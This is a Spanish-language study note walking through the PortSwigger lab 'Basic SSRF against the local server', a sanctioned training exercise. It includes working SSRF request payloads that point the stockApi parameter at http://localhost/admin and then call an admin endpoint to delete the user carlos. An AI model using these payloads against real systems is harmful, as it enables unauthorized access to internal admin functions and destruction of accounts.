---
aliases:
  - SSRF 001 - directo a localhost
  - basic ssrf localhost
tags:
  - vuln/ssrf
  - example
  - portswigger
---

# 001 — SSRF directo contra el propio server (localhost)

> Lab: [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost) · **Apprentice** · técnica → [[vulnerabilities/007-ssrf/ssrf|entry point]]

## ¿Por qué acá? (el caso base)
- **Es el punto de partida:** controlás la URL **y ves la respuesta**, y **no hay filtro**. Todo lo demás es este ataque + una complicación.
- **Por qué funciona:** el panel admin confía en las peticiones que vienen de **localhost** (sin auth) → el server te lo abre porque la request "sale de él mismo".

## Cómo explotarlo
Interceptá el **"Check stock"** y cambiá `stockApi` por la URL interna:
```http
POST /product/stock HTTP/1.1
Host: LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin
```
La respuesta trae el HTML del panel. Ahí ves el link de borrado → mandalo:
```http
stockApi=http://localhost/admin/delete?username=carlos
```

## Verificación
La respuesta del stock check devuelve el **panel admin** (200 + HTML), y tras el segundo request **carlos desaparece** → lab resuelto.

## Detalles que se pasan por alto
- El valor va **URL-encodeado** dentro del body `x-www-form-urlencoded`.
- `http://127.0.0.1/admin` es equivalente a `http://localhost/admin` (útil recordarlo para [[vulnerabilities/007-ssrf/examples/003-bypass-blacklist-variantes-localhost|003]]).
- No hace falta Collaborator ni exploit server: **todo in-band, en la misma request**.

→ Siguiente: [[vulnerabilities/007-ssrf/examples/002-ssrf-escaneo-red-interna|002 · el admin no está en localhost, sino en otro back-end]]
